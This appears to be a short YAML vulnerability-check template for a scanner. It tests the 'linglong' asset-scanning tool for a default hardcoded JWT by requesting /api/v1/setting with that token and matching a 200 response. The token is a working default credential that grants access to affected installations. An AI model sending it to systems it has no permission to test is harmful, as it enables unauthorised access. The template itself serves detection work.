id: poc-yaml-linglong-default-jwt-token
info:
  name: linglong Default JWT Token Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: hardcoded-credentials

http:
  - method: GET
    path:
      - "/api/v1/setting?ip=&port=&pagenum=1&pagesize=10"
    headers:
      Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imxpbmdsb25nIiwicGFzc3dvcmQiOiJ0ZXN0IiwiZXhwIjo0ODQzMzM3NTUxLCJpc3MiOiJsaW5nbG9uZyJ9.cJgsk7Csa4VVFAy8qAfW-nysZl8_ic_M87pYA-etLZ4
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"masscan_thred"'
          - '"code":200'
      - type: word
        part: body
        words:
          - "<"
        negative: true
